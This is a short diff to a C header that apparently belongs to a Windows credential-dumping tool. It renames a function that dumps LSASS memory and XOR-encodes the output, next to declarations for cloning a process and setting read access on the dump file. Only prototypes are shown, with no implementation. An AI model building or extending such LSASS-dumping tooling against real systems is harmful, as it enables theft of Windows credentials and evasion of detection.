@@ -10,7 +10,7 @@ HANDLE CloneProcess(void);
 DWORD GetProcessIdFromHandle(HANDLE hProcess);
 
 // Dump LSASS
-BOOL DmpAndXor(const char* outPath, const char* key, size_t key_len);
+BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len);
 
 // Set read access to dump
 BOOL SetFileGenericReadAccess(const char* filePath);
